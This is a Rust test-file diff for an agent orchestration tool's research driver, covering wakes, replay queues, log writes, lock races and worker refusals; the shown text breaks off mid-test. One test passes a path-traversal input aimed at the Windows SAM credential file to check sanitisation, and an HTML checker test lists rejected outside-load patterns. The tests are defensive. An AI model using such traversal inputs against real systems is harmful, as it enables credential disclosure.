@@ -219,6 +219,7 @@ fn state(stage: Stage, styles: &[&str]) -> State {
         told: false,
         logged: false,
         end_tries: 0,
+        end_refused_at: None,
     }
 }
 
@@ -331,20 +332,26 @@ fn p47c_the_six_route_examples_parse_and_validate() {
 fn p47c_the_role_and_the_seat_skill_send_research_to_herdr_scholar() {
     const ROLE: &str = include_str!("../../nirvana/claude/ROLE.md");
     const SKILL: &str = include_str!("../../nirvana/claude/skills/seat/SKILL.md");
+    // Read with its line breaks as spaces, so a rewrap is not a failure.
+    let role = ROLE.split_whitespace().collect::<Vec<_>>().join(" ");
     for found in [
         "goes to `herdr scholar \"<question>\"`",
-        "then end your turn",
+        "then end your turn and wait for its wake: do not also run the research yourself",
         "`herdr scholar resume <run>`",
-        "seated with\n  `--profile scholar`",
-        "publish the page only when this session\n  can and the owner wants it",
+        "A single lookup stays an ordinary `research.web` order, seated as the line above says",
+        "publish the page only when this session can and the owner wants it",
     ] {
-        assert!(ROLE.contains(found), "{found:?} not in ROLE.md");
+        assert!(role.contains(found), "{found:?} not in ROLE.md");
     }
-    // The agy plugin's build fails above 24 KB of role text (`nirvana/agy_plugin.py` BODY_CAP).
-    assert!(ROLE.len() < 24 * 1024, "{}", ROLE.len());
+    // Review F12: one profile for a single lookup, the one the line above names.
+    assert!(!role.contains("--profile scholar"), "ROLE.md names two profiles for a lookup");
+    // The agy plugin's build fails above 24 KB of role text (`nirvana/agy_plugin.py` BODY_CAP); the fix round's brief
+    // holds ROLE.md under 13,100 bytes.
+    assert!(ROLE.len() < 13_100, "{}", ROLE.len());
     for found in [
         "### A research question: `herdr scholar`",
-        "its summary starts with the page's path",
+        "The one wake is the driver's end line.",
+        "its lines do not wake you",
         "`herdr scholar tag <run> hit|partial|miss",
     ] {
         assert!(SKILL.contains(found), "{found:?} not in the seat skill");
@@ -500,7 +507,7 @@ fn p47c_a_route_that_fails_twice_runs_one_fallback_order_with_the_owners_words()
     // The Method section is told.
     let mut fell = started.state.clone();
     fell.route = Some(record);
-    let notes = method_notes(&fell).join("\n");
+    let notes = method_notes(&fell, &J::new("fell-notes").state()).join("\n");
     assert!(notes.contains("the routing failed"), "{notes}");
     nirvana_seat::set_test_world(None);
 }
@@ -670,8 +677,14 @@ fn p47c_no_researcher_passing_ends_no_delivery_and_seats_no_writer() {
     match settle(&mut st, &j.state(), NOW) {
         Step::Finish(end, why) => {
             assert_eq!(end, ends::NO_DELIVERY);
-            assert!(why.contains("r1 gated asked: 3 send-backs spent"), "{why}");
-            assert!(why.contains("r2 failed (failed): no Work Report"), "{why}");
+            assert!(
+                why.contains("r1 (benchmark) asked: \"3 send-backs spent\""),
+                "{why}"
+            );
+            assert!(
+                why.contains("r2 (trajectory) failed (failed): no Work Report"),
+                "{why}"
+            );
         }
         other => panic!("{other:?}"),
     }
@@ -919,14 +932,23 @@ fn p47c_the_run_ends_only_after_its_wake_is_typed_within_a_bound() {
     let mut st = state(Stage::Ending, &["benchmark"]);
     st.end = Some(ends::REPORT.into());
     st.ended_at = Some(NOW);
+    // Every end tells, a report too (fix round item 1): the driver's end line is the wake.
+    let j0 = J::new("end-tells");
+    assert_eq!(
+        next(&st, &j0.state(), NOW, &Caps::default(), false),
+        Step::Tell
+    );
+    st.told = true;
     st.logged = true;
-    // A report tells nothing of its own: the writer's delivery is the wake.
-    assert!(!tells(ends::REPORT) && tells(ends::NO_DELIVERY));
     let mut j = J::new("end-wait");
     j.seat("q-write", WRITE_CLASS);
     j.pass("q-write");
+    j.add(Kind::Asked {
+        order: None,
+        question: "scholar report: docs/research/2026-11-20-q/report.html".into(),
+    });
     let run = j.state();
-    assert_eq!(run.queue.len(), 2, "{:?}", run.queue);
+    assert_eq!(run.queue.len(), 1, "{:?}", run.queue);
     let can = Caps {
         wakeable: Some(true),
         ..Caps::default()
@@ -956,63 +978,110 @@ fn p47c_the_run_ends_only_after_its_wake_is_typed_within_a_bound() {
 
 // ---- the replay hunk ----
 
-#[test]
-fn p47c_replay_queues_nothing_for_a_scholar_researcher_and_every_line_of_the_writer() {
-    let mut j = J::new("quiet");
-    // A researcher that passes first time.
-    j.seat("q-r1", RESEARCH_CLASS);
-    j.pass("q-r1");
-    // One sent back, whose child (why send_back) passes.
-    j.seat("q-r2", RESEARCH_CLASS);
-    j.deliver("q-r2", "x");
-    j.send_back("q-r2", "q-r2-s1");
-    j.pass("q-r2-s1");
-    assert_eq!(j.state().queue, Vec::new(), "researchers queue nothing");
-    // A question, a stall and a failure still queue.
-    j.seat("q-r3", RESEARCH_CLASS);
-    j.deliver("q-r3", "blocked");
+/// Every line kind the replay hunk reads, on orders seated with `mark` as their `why` and ids starting `p`.
+fn every_line_kind(j: &mut J, mark: Option<&str>, p: &str) {
+    let seat = |j: &mut J, id: &str, class: &str| {
+        j.add(Kind::Seated(Box::new(seated(id, class, mark, None))))
+    };
+    let id = |n: &str| format!("{p}-{n}");
+    // Passes first time.
+    seat(j, &id("r1"), RESEARCH_CLASS);
+    j.pass(&id("r1"));
+    // Sent back once; the child (why send_back) passes.
+    seat(j, &id("r2"), RESEARCH_CLASS);
+    j.deliver(&id("r2"), "x");
+    j.send_back(&id("r2"), &id("r2-s1"));
+    j.pass(&id("r2-s1"));
+    // The gate asks, and its question follows in the same transaction (`nirvana_gate::send_back`).
+    seat(j, &id("r3"), RESEARCH_CLASS);
+    j.deliver(&id("r3"), "blocked");
+    j.gate(&id("r3"), "asked", "blocked");
     j.add(Kind::Asked {
-        order: Some("q-r3".into()),
-        question: "q-r3 asks for a login".into(),
+        order: Some(id("r3")),
+        question: format!("{}: which login?", id("r3")),
     });
-    j.gate("q-r3", "asked", "blocked");
-    j.seat("q-r4", RESEARCH_CLASS);
+    // Its worker died.
+    seat(j, &id("r4"), RESEARCH_CLASS);
+    j.died(&id("r4"));
+    // Stopped, as `herdr seat stop` and the driver's cap stop it.
+    seat(j, &id("r5"), RESEARCH_CLASS);
+    j.add(Kind::Interrupted {
+        order: id("r5"),
+        why: "stopped by `herdr seat stop`".into(),
+    });
+    j.add(Kind::Ended {
+        order: Some(id("r5")),
+        outcome: "stopped".into(),
+        why: None,
+        exit: None,
+        pools: Vec::new(),
+        pools_basis: None,
+    });
+    // Failed.
+    seat(j, &id("r6"), RESEARCH_CLASS);
+    j.add(Kind::Ended {
+        order: Some(id("r6")),
+        outcome: "failed".into(),
+        why: Some("no Work Report".into()),
+        exit: Some(1),
+        pools: Vec::new(),
+        pools_basis: None,
+    });
+    // Stalled: the supervisor restarts it, the driver does not.
+    seat(j, &id("r7"), RESEARCH_CLASS);
     j.add(Kind::Stalled {
-        order: "q-r4".into(),
+        order: id("r7"),
         silent_s: 600,
         stalls: 1,
         next: "restart in 30 s".into(),
     });
-    // The writer's every line.
-    j.seat("q-write", WRITE_CLASS);
-    j.pass("q-write");
-    // An ordinary research.web order, not a scholar's.
-    j.add(Kind::Seated(Box::new(seated(
-        "plain",
-        RESEARCH_CLASS,
-        None,
-        None,
-    ))));
-    j.pass("plain");
-    let lines: Vec<String> = j
-        .state()
-        .queue
-        .iter()
-        .map(|item| item.line.clone())
-        .collect();
-    let starts: Vec<&str> = lines
-        .iter()
-        .map(|line| line.split(' ').next().unwrap())
-        .collect();
+    // The writer: interrupted, reseated under its own id (seated as its own root), which passes.
+    seat(j, &id("w"), WRITE_CLASS);
+    j.died(&id("w"));
+    seat(j, &id("w-r1"), WRITE_CLASS);
+    j.pass(&id("w-r1"));
+}
+
+#[test]
+fn p47c_replay_quiets_what_the_driver_handles_and_every_line_of_an_ordinary_order_queues() {
+    // A scholar chain: only the stall queues.
+    let mut j = J::new("quiet-scholar");
+    every_line_kind(&mut j, Some(STAGE_WHY), "s");
+    let lines: Vec<String> = j.state().queue.iter().map(|item| item.line.clone()).collect();
+    assert_eq!(lines, ["s-r7 stalled (600 s silent): restart in 30 s"], "{lines:#?}");
+    // The same kinds on ordinary orders of the same classes queue every line, as `queue_line` wrote them at
+    // ccb8bef0.
+    let mut j = J::new("quiet-plain");
+    every_line_kind(&mut j, None, "o");
+    let lines: Vec<String> = j.state().queue.iter().map(|item| item.line.clone()).collect();
+    let died = |order: &str| {
+        format!(
+            "{order} interrupted: {}: pid 4242 is gone; continue it from its checkpoint (the handoff skill, then \
+             `herdr seat run`), redo it, or ask",
+            nirvana_run::WORKER_DIED
+        )
+    };
     assert_eq!(
-        starts,
-        ["q-r3", "q-r3", "q-r4", "q-write", "q-write", "plain", "plain"],
-        "{lines:#?}"
-    );
-    assert!(lines[0].starts_with("q-r3 asks:"), "{lines:#?}");
-    assert!(lines[1].starts_with("q-r3 gated asked"), "{lines:#?}");
-    assert!(
-        lines[3].starts_with("q-write delivered done:"),
+        lines,
+        [
+            "o-r1 delivered done: o-r1 answered".to_owned(),
+            "o-r1 gated pass: every axis passed".to_owned(),
+            "o-r2 delivered done: x".to_owned(),
+            "o-r2 gated sent_back: sources: a cited URL was never opened".to_owned(),
+            "o-r2-s1 delivered done: o-r2-s1 answered".to_owned(),
+            "o-r2-s1 gated pass: every axis passed".to_owned(),
+            "o-r3 delivered done: blocked".to_owned(),
+            "o-r3 gated asked: blocked".to_owned(),
+            "o-r3 asks: o-r3: which login?".to_owned(),
+            died("o-r4"),
+            "o-r5 interrupted: stopped by `herdr seat stop`".to_owned(),
+            "o-r5 ended stopped".to_owned(),
+            "o-r6 ended failed: no Work Report".to_owned(),
+            "o-r7 stalled (600 s silent): restart in 30 s".to_owned(),
+            died("o-w"),
+            "o-w-r1 delivered done: o-w-r1 answered".to_owned(),
+            "o-w-r1 gated pass: every axis passed".to_owned(),
+        ],
         "{lines:#?}"
     );
 }
@@ -1068,6 +1137,7 @@ fn p47c_the_writers_summary_path_fits_the_wake_with_a_40_character_slug() {
     let mut st = state(Stage::Write, &[]);
     st.slug = slug40.clone();
     st.report_dir = format!("{REPORTS}/2026-11-20-{slug40}");
+    st.run = format!("scholar-20261120-{slug40}");
     let path = report_html_rel(&st);
     let mut j = J::new("wake-path");
     let id = writer_id(&slug40);
@@ -1076,13 +1146,32 @@ fn p47c_the_writers_summary_path_fits_the_wake_with_a_40_character_slug() {
         &id,
         &format!("{path} The answer: X is slow because of Y, measured on three machines."),
     );
+    j.gate(&id, "pass", "every axis passed");
+    // The writer's own lines are quiet; the driver's end line is the wake, and its 120 characters hold the path.
+    assert!(j.state().queue.is_empty(), "{:?}", j.state().queue);
+    st.writer = Some(Chain {
+        end: passed(&id),
+        ..writer_chain(&st)
+    });
+    st.end = Some(ends::REPORT.into());
+    st.end_why = Some(path.clone());
+    j.add(Kind::Asked {
+        order: None,
+        question: tell_line(&st, &j.state()),
+    });
     let line = j.state().queue[0].line.clone();
     assert!(
-        line.starts_with(&format!("{id} delivered done: {path}")),
+        line.starts_with(&format!("the run asks: scholar report: {path} (")),
         "{line}"
     );
     let digest = nirvana_run::digest(&st.run, &j.state().queue);
     assert!(digest.contains(&path), "{digest}");
+    // The answer line follows the path in the journal's whole line.
+    assert!(
+        tell_line(&st, &j.state()).contains("): The answer: X is slow because of Y"),
+        "{}",
+        tell_line(&st, &j.state())
+    );
     // The writer's order asks for the path first, and owns its folder.
     let text = write_text(&st, &j.state());
     assert!(
@@ -1269,7 +1358,7 @@ fn p47c_slugs_and_ids_stay_plain_and_short() {
     let path = slug("../../Windows/System32/config/SAM.txt");
     assert_eq!(path, "windows-system32-config-sam-txt");
     let root = temp("slug-root");
-    let dir = report_dir(&root, &date, &path);
+    let dir = report_dir(&root, &date, &path, &[]);
     assert!(
         Path::new(&dir)
             .components()
@@ -1282,7 +1371,12 @@ fn p47c_slugs_and_ids_stay_plain_and_short() {
     std::fs::create_dir_all(project.run_dir(&first)).unwrap();
     assert_eq!(run_id(&project, &ymd, &path), format!("{first}-2"));
     std::fs::create_dir_all(root.join(&dir)).unwrap();
-    assert_eq!(report_dir(&root, &date, &path), format!("{dir}-2"));
+    assert_eq!(report_dir(&root, &date, &path, &[]), format!("{dir}-2"));
+    // A folder another run's state names is taken though nothing created it yet (review F2).
+    assert_eq!(
+        report_dir(&root, &date, "fresh", &[format!("{REPORTS}/{date}-fresh")]),
+        format!("{REPORTS}/{date}-fresh-2")
+    );
     // A word that ends at the cap is kept whole; one cut by the cap goes.
     assert_eq!(
         slug("aaaaaaaaaa bbbbbbbbbb cccccccccc ddddddd tail"),
@@ -1407,35 +1501,35 @@ fn p47c_a_driver_at_the_cap_stops_the_running_chain_and_tells_the_orchestrator()
 #[test]
 fn p47c_the_html_check_fails_every_outside_load_and_passes_a_link() {
     let bad = [
-        ("<script src=\"app.js\"></script>", "a <script> with a src"),
+        ("<script src=\"app.js\"></script>", "<script> src: app.js"),
         (
             "<script type=\"module\" src='https://cdn.x/a.js'></script>",
-            "a <script> with a src",
+            "<script> src: https://cdn.x/a.js",
         ),
         (
             "<link rel=\"stylesheet\" href=\"https://fonts.x/css\">",
-            "a <link> href on another host",
+            "<link rel=stylesheet> href: https://fonts.x/css",
         ),
         (
             "<img src=\"http://x.org/a.png\">",
-            "a <img> src on another host",
+            "<img> src: http://x.org/a.png",
         ),
         (
             "<img srcset=\"//x.org/a.png 2x\">",
-            "a <img> srcset on another host",
+            "<img> srcset: //x.org/a.png 2x",
         ),
         (
             "<iframe src=\"https://x.org\"></iframe>",
-            "a <iframe> src on another host",
+            "<iframe> src: https://x.org",
         ),
-        ("<style>@import 'x.css';</style>", "an @import"),
+        ("<style>@import 'x.css';</style>", "<style> @import: @import 'x.css';"),
         (
             "<div style=\"background:url(https://x.org/a.png)\"></div>",
-            "a url() on another host",
+            "<div> style url(: url(https://x.org/a.png)",
         ),
         (
             "<style>body{background:url( 'http://x.org/a.png')}</style>",
-            "a url() on another host",
+            "<style> url(: url( 'http://x.org/a.png')}",
         ),
     ];
     for (html, why) in bad {
@@ -1457,7 +1551,7 @@ fn p47c_the_html_check_fails_every_outside_load_and_passes_a_link() {
     std::fs::write(dir.join("report.html"), "<img src=\"https://x.org/a.png\">").unwrap();
     assert_eq!(
         check_files(&dir),
-        ["report.html loads a <img> src on another host"]
+        ["report.html loads <img> src: https://x.org/a.png"]
     );
     std::fs::write(dir.join("report.html"), good).unwrap();
     assert!(check_files(&dir).is_empty());
@@ -1791,11 +1885,7 @@ fn p47c_a_whole_scripted_run_seats_researchers_then_the_writer_logs_and_ends() {
     assert_eq!(done.end.as_deref(), Some(ends::REPORT), "{done:#?}");
     assert_eq!(routes.get(), 1);
     assert!(ended.get());
-    assert_eq!(
-        wakes.get(),
-        0,
-        "a report wakes through the writer's own delivery"
-    );
+    assert_eq!(wakes.get(), 1, "the driver's end line is the wake");
     // The seated lines.
     let replayed = nirvana_run::replay(&journal.read().0);
     assert_eq!(
@@ -1850,18 +1940,19 @@ fn p47c_a_whole_scripted_run_seats_researchers_then_the_writer_logs_and_ends() {
         wtext.contains(&format!("\nowns: {}/\n", started.state.report_dir)),
         "{wtext}"
     );
-    // The wake: nothing of the researchers, the writer's lines, its delivery opening with the path.
+    // The wake: nothing of the researchers or the writer, one line from the driver, opening with the path and the
+    // writer's answer line after it.
     let lines = queued.borrow().clone();
-    assert!(!lines.is_empty());
+    assert_eq!(lines.len(), 1, "{lines:#?}");
     assert!(
-        lines
-            .iter()
-            .all(|line| line.starts_with(&format!("{writer} "))),
+        lines[0].starts_with(&format!("the run asks: scholar report: {html_rel} (")),
         "{lines:#?}"
     );
+    let told = asked_lines(&project, &run);
+    assert_eq!(told.len(), 1, "{told:?}");
     assert!(
-        lines[0].starts_with(&format!("{writer} delivered done: {html_rel}")),
-        "{lines:#?}"
+        told[0].ends_with("): The build is slow because of X."),
+        "{told:?}"
     );
     // The log line, and the run's end.
     let log = read_log(&project.root);
@@ -1955,4 +2046,958 @@ fn p47c_nothing_to_research_ends_told_logged_and_with_no_order() {
     assert_eq!(read_log(&project.root)[0]["end"], ends::NOTHING);
     assert!(!project.root.join(&started.state.report_dir).exists());
     nirvana_seat::set_test_world(None);
+}
+
+// ---- the fix round (the P47c review of 2026-11-20, F1 to F12) ----
+
+fn asked_lines(project: &Project, run: &str) -> Vec<String> {
+    project
+        .journal(run)
+        .read()
+        .0
+        .iter()
+        .filter_map(|event| match &event.kind {
+            Kind::Asked {
+                order: None,
+                question,
+            } => Some(question.clone()),
+            _ => None,
+        })
+        .collect()
+}
+
+/// Review F2: two runs of one question on one day claim two folders and two ids before either folder exists; a run
+/// whose driver died keeps its claim; a start makes no folder under docs/research/.
+#[test]
+fn p47c_two_runs_of_one_question_on_one_day_get_two_folders_and_two_ids() {
+    let (_home, project) = git_project("p47c-two-folders");
+    let none = |_: &str| None;
+    let t = 1_763_600_000;
+    let question = "Is wgpu still on 0.30?";
+    let first = start(&project, question, None, &none, false, t).unwrap();
+    assert!(!project.root.join(&first.state.report_dir).exists());
+    let held = take_driver(&project, &first.state.run).unwrap();
+    let forced = start(&project, question, None, &none, true, t).unwrap();
+    assert_ne!(forced.state.run, first.state.run);
+    assert_eq!(
+        forced.state.report_dir,
+        format!("{}-2", first.state.report_dir)
+    );
+    drop(held);
+    // The first run's driver died: the same question asked again, no --force needed.
+    assert!(!driver_live(&project, &first.state.run));
+    let again = start(&project, question, None, &none, false, t).unwrap();
+    let dirs: std::collections::BTreeSet<&String> = [
+        &first.state.report_dir,
+        &forced.state.report_dir,
+        &again.state.report_dir,
+    ]
+    .into_iter()
+    .collect();
+    let runs: std::collections::BTreeSet<&String> =
+        [&first.state.run, &forced.state.run, &again.state.run]
+            .into_iter()
+            .collect();
+    assert_eq!((dirs.len(), runs.len()), (3, 3), "{dirs:?} {runs:?}");
+    // The claim is the state file's, so nothing is left in docs/research/ by a run that never routes.
+    assert!(!project.root.join(REPORTS).exists());
+    nirvana_seat::set_test_world(None);
+}
+
+/// Review F3 and F11: a log whose last line lost its newline, a line that does not parse, a run line asked for twice.
+#[test]
+fn p47c_the_log_keeps_each_line_whole_and_writes_a_run_once() {
+    use std::io::Write as _;
+    let root = temp("log-newline");
+    let project = Project::at(&root);
+    let path = log_path(&root);
+    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+    // The review's reproduction: a run line with no final newline (a hand edit), then a tag.
+    let run_line = serde_json::json!({"v": 1, "run": "scholar-1", "end": "report", "date": "2026-11-20",
+        "report": "docs/research/2026-11-20-q/report.html"});
+    std::fs::write(&path, run_line.to_string()).unwrap();
+    tag_verb(&root, "scholar-1", "hit", Some("good"), &|_| None, 5).unwrap();
+    let (lines, bad) = read_log_counted(&root);
+    assert_eq!(
+        (lines.len(), bad),
+        (2, 0),
+        "{:?}",
+        std::fs::read_to_string(&path)
+    );
+    // A second tag is still taken, and the list still shows the run.
+    tag_verb(&root, "scholar-1", "miss", None, &|_| None, 6).unwrap();
+    assert_eq!(
+        outcome_of(&read_log(&root), "scholar-1").as_deref(),
+        Some("miss")
+    );
+    let list = list_text(&project);
+    assert!(
+        list.starts_with("scholar-1 · 2026-11-20 · report · outcome miss"),
+        "{list}"
+    );
+    assert!(!list.contains("could not be read"), "{list}");
+    // A line that does not parse is skipped, counted, and said.
+    std::fs::OpenOptions::new()
+        .append(true)
+        .open(&path)
+        .unwrap()
+        .write_all(b"{not json\n")
+        .unwrap();
+    let (lines, bad) = read_log_counted(&root);
+    assert_eq!((lines.len(), bad), (3, 1));
+    let list = list_text(&project);
+    assert!(
+        list.contains("1 line(s) of docs/research/log.jsonl could not be read"),
+        "{list}"
+    );
+    assert!(list.starts_with("scholar-1 ·"), "{list}");
+    // The run's line is written once, though a kill between the append and the save asks for it again.
+    let mut st = state(Stage::Ending, &["benchmark"]);
+    st.end = Some(ends::NO_DELIVERY.into());
+    let line = log_line(&st, &J::new("log-once").state(), 1600);
+    assert!(append_run_line(&root, &line).unwrap());
+    assert!(!append_run_line(&root, &line).unwrap());
+    let written = read_log(&root)
+        .iter()
+        .filter(|line| line["run"] == st.run.as_str() && line.get("end").is_some())
+        .count();
+    assert_eq!(written, 1);
+}
+
+/// Review F11, through the driver: the log line appended, then killed before `logged` was saved; the resumed driver
+/// writes no second line.
+#[test]
+fn p47c_a_resume_after_the_log_append_writes_no_second_line() {
+    let (_home, project) = git_project("p47c-log-twice");
+    let t0 = 1_763_600_000;
+    let started = start(&project, "Why?", Some("wT:p9"), &|_| None, false, t0).unwrap();
+    let run = started.state.run.clone();
+    let mut st = started.state.clone();
+    st.stage = Stage::Ending;
+    st.end = Some(ends::NO_DELIVERY.into());
+    st.end_why = Some("no researcher passed: r1 x".into());
+    st.ended_at = Some(t0);
+    st.told = true;
+    save_state(&project, &st).unwrap();
+    let replayed = nirvana_run::replay(&project.journal(&run).read().0);
+    append_line(&log_path(&project.root), &log_line(&st, &replayed, t0)).unwrap();
+    let route = |_: &[String], _: &Path| Err("no route turn in this test".to_owned());
+    let end_run = |project: &Project, run: &str| {
+        project
+            .journal(run)
+            .append(t0, ended_kind())
+            .map(|_| ())
+            .map_err(|err| err.to_string())
+    };
+    let now = || t0;
+    let world = World {
+        wakeable: &|_| false,
+        ..world_with(&route, &|_| {}, &end_run, &|_, _| {}, &now)
+    };
+    let done = drive(&project, &run, &world, Caps::default()).unwrap();
+    assert_eq!(done.stage, Stage::Done);
+    let written = read_log(&project.root)
+        .iter()
+        .filter(|line| line["run"] == run.as_str() && line.get("end").is_some())
+        .count();
+    assert_eq!(written, 1);
+    nirvana_seat::set_test_world(None);
+}
+
+/// Review F6: `drive`, `stop`, `tag` and `resume` refuse in a seated worker as the question verb does, and `drive` or
+/// `stop` of a run id that is not there writes nothing at all: no `driver.json`, no lock folder, no `asked` line.
+#[test]
+fn p47c_the_verbs_refuse_in_a_worker_and_an_unknown_run_writes_nothing() {
+    let (_home, project) = git_project("p47c-worker-verbs");
+    let started = start(
+        &project,
+        "Why is the build slow?",
+        None,
+        &|_| None,
+        false,
+        1_763_600_000,
+    )
+    .unwrap();
+    let run = started.state.run.clone();
+    let route = |_: &[String], _: &Path| -> Result<End, String> {
+        panic!("no route turn may start in this test")
+    };
+    let wakes = Cell::new(0);
+    let wake = |_: &Project, _: &str| wakes.set(wakes.get() + 1);
+    let now = || 1_763_600_000;
+    let world = world_with(&route, &|_| {}, &|_, _| Ok(()), &wake, &now);
+    let worker = |key: &str| {
+        (key == crate::nirvana_profiles::SEATED_ORDER_ENV).then(|| "x-r1".to_owned())
+    };
+    let before = listing(&project.root);
+    let refusals = [
+        (
+            "drive",
+            drive_verb(&project, &run, &world, Caps::default(), &worker).err(),
+        ),
+        (
+            "stop",
+            stop_verb(&project, &run, &world, Caps::default(), &worker).err(),
+        ),
+        (
+            "tag",
+            tag_verb(&project.root, &run, "hit", None, &worker, 1).err(),
+        ),
+        ("resume", refused_in_worker(&worker, "resume").err()),
+    ];
+    for (verb, refused) in refusals {
+        let refused = refused.unwrap_or_else(|| panic!("{verb} ran in a worker"));
+        assert!(
+            refused.starts_with("refused inside order x-r1") && refused.contains(verb),
+            "{verb}: {refused}"
+        );
+    }
+    assert_eq!(listing(&project.root), before);
+    // A run id that is not there.
+    let none = |_: &str| None;
+    let ghost = "scholar-20261120-not-there";
+    for (verb, why) in [
+        (
+            "drive",
+            drive_verb(&project, ghost, &world, Caps::default(), &none).unwrap_err(),
+        ),
+        (
+            "stop",
+            stop_verb(&project, ghost, &world, Caps::default(), &none).unwrap_err(),
+        ),
+        // `drive` itself, as the kill matrix and `stop` call it: the state is read before the lock is taken.
+        (
+            "drive()",
+            drive(&project, ghost, &world, Caps::default()).unwrap_err(),
+        ),
+    ] {
+        assert!(why.contains("is no scholar run"), "{verb}: {why}");
+    }
+    assert_eq!(listing(&project.root), before);
+    assert!(!project.run_dir(ghost).exists());
+    assert_eq!(wakes.get(), 0);
+    nirvana_seat::set_test_world(None);
+}
+
+/// Review F11: a driver whose loop panics says so on the run as one that returns an error does, the lock goes with
+/// the unwind, and `status` names the way on.
+#[test]
+fn p47c_a_driver_that_panics_leaves_the_gave_up_line_and_status_names_resume() {
+    let (_home, project) = git_project("p47c-panic");
+    let started = start(
+        &project,
+        "Why is the build slow?",
+        Some("wT:p9"),
+        &|_| None,
+        false,
+        1_763_600_000,
+    )
+    .unwrap();
+    let run = started.state.run.clone();
+    let route = |_: &[String], _: &Path| -> Result<End, String> {
+        panic!("a bug in the route stand-in")
+    };
+    let wakes = Cell::new(0);
+    let wake = |_: &Project, _: &str| wakes.set(wakes.get() + 1);
+    let now = || 1_763_600_000;
+    let world = world_with(&route, &|_| {}, &|_, _| Ok(()), &wake, &now);
+    let why = drive_verb(&project, &run, &world, Caps::default(), &|_| None).unwrap_err();
+    assert!(why.contains("a bug in the route stand-in"), "{why}");
+    let asked = asked_lines(&project, &run);
+    assert_eq!(asked.len(), 1, "{asked:?}");
+    assert!(
+        asked[0].starts_with(&format!(
+            "scholar gave_up: `herdr scholar status {run}`"
+        )) && asked[0].contains(&format!("`herdr scholar resume {run}`")),
+        "{asked:?}"
+    );
+    assert_eq!(wakes.get(), 1);
+    assert!(!driver_live(&project, &run));
+    let state = load_state(&project, &run).unwrap();
+    let replayed = nirvana_run::replay(&project.journal(&run).read().0);
+    let text = status_text(&project, &state, &replayed);
+    assert!(
+        text.contains(&format!(
+            "no driver holds this run: `herdr scholar resume {run}`"
+        )),
+        "{text}"
+    );
+    nirvana_seat::set_test_world(None);
+}
+
+/// Review F10: `herdr run end` refusing is tried for 30 minutes of polls, then the note and the queued line name the
+/// command and herdr's own words.
+#[test]
+fn p47c_a_run_end_that_keeps_refusing_is_tried_for_thirty_minutes_then_named() {
+    let (_home, project) = git_project("p47c-end-refused");
+    let t0 = 1_763_600_000;
+    let started = start(&project, "Why?", Some("wT:p9"), &|_| None, false, t0).unwrap();
+    let run = started.state.run.clone();
+    let mut st = started.state.clone();
+    st.stage = Stage::Ending;
+    st.end = Some(ends::NO_DELIVERY.into());
+    st.end_why = Some("no researcher passed: r1 x".into());
+    st.ended_at = Some(t0);
+    st.told = true;
+    st.logged = true;
+    save_state(&project, &st).unwrap();
+    let clock = Cell::new(t0);
+    let now = || clock.get();
+    let sleep = |secs: u64| clock.set(clock.get() + secs);
+    let tries = Cell::new(0u64);
+    let refusal = format!("herdr run: {run} has a delivered order not gated yet: lr-1");
+    let end_run = |_: &Project, _: &str| {
+        tries.set(tries.get() + 1);
+        Err(refusal.clone())
+    };
+    let wakes = Cell::new(0);
+    let wake = |_: &Project, _: &str| wakes.set(wakes.get() + 1);
+    let route = |_: &[String], _: &Path| Err("no route turn in this test".to_owned());
+    let world = World {
+        wakeable: &|_| false,
+        ..world_with(&route, &sleep, &end_run, &wake, &now)
+    };
+    let done = drive(&project, &run, &world, Caps::default()).unwrap();
+    assert_eq!(done.stage, Stage::Done);
+    // A try at each 5 s poll, the first at the refusal's start, for 30 minutes.
+    assert_eq!(tries.get(), END_REFUSED_S / POLL_S + 1);
+    assert_eq!(END_REFUSED_S, 30 * 60);
+    let note = done.notes.last().unwrap();
+    assert!(
+        note.contains(&format!("`herdr run end {run}`")) && note.contains(&refusal),
+        "{note}"
+    );
+    let asked = asked_lines(&project, &run);
+    assert_eq!(asked.len(), 1, "{asked:?}");
+    assert!(
+        asked[0].contains(&format!("`herdr run end {run}`")) && asked[0].contains(&refusal),
+        "{asked:?}"
+    );
+    assert_eq!(wakes.get(), 1);
+    nirvana_seat::set_test_world(None);
+}
+
+/// Review F12: `status` names a report only for a run that has one.
+#[test]
+fn p47c_status_names_a_report_only_when_there_is_one() {
+    let project = Project::at(temp("status-report"));
+    let run = J::new("status-report").state();
+    let mut st = state(Stage::Research, &["benchmark"]);
+    assert!(
+        !status_text(&project, &st, &run).contains("report:"),
+        "a running run"
+    );
+    st.stage = Stage::Done;
+    st.end = Some(ends::NO_DELIVERY.into());
+    st.end_why = Some("no researcher passed".into());
+    assert!(
+        !status_text(&project, &st, &run).contains("report:"),
+        "no_delivery"
+    );
+    st.end = Some(ends::REPORT.into());
+    st.end_why = Some(report_html_rel(&st));
+    let text = status_text(&project, &st, &run);
+    assert!(
+        text.contains(&format!("\nreport: {}\n", report_html_rel(&st))),
+        "{text}"
+    );
+}
+
+/// Review F12: a starting driver's take waits out a `status` that looks at the lock, so it never loses to one.
+#[test]
+fn p47c_a_starting_driver_wins_against_a_status_that_reads_the_lock() {
+    let root = temp("lock-race");
+    let project = Project::at(&root);
+    let st = state(Stage::Research, &["benchmark"]);
+    save_state(&project, &st).unwrap();
+    // A status's look at the lock, held long: the driver's take waits it out.
+    let dir = driver_dir(&project, &st.run);
+    let (held_tx, held_rx) = std::sync::mpsc::channel();
+    let looker = std::thread::spawn(move || {
+        let lock = nirvana_seat::Lock::try_take(&dir, 1).unwrap();
+        held_tx.send(()).unwrap();
+        std::thread::sleep(Duration::from_millis(600));
+        drop(lock);
+    });
+    held_rx.recv().unwrap();
+    let taken = take_driver(&project, &st.run);
+    looker.join().unwrap();
+    assert!(taken.is_ok(), "{:?}", taken.err());
+    drop(taken);
+    // A status reading over and over while drivers take and let go: every take wins.
+    let stop = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
+    let reader = {
+        let stop = stop.clone();
+        let (root, run) = (root.clone(), st.run.clone());
+        std::thread::spawn(move || {
+            let project = Project::at(&root);
+            let mut reads = 0u32;
+            while !stop.load(std::sync::atomic::Ordering::SeqCst) {
+                let _ = driver_live(&project, &run);
+                reads += 1;
+            }
+            reads
+        })
+    };
+    for _ in 0..20 {
+        let lock = take_driver(&project, &st.run);
+        assert!(lock.is_ok(), "{:?}", lock.err());
+    }
+    stop.store(true, std::sync::atomic::Ordering::SeqCst);
+    assert!(reader.join().unwrap() > 0);
+    // A driver that holds the run is still refused by name, after the wait.
+    let held = take_driver(&project, &st.run).unwrap();
+    let at = std::time::Instant::now();
+    let refused = take_driver(&project, &st.run).err().unwrap();
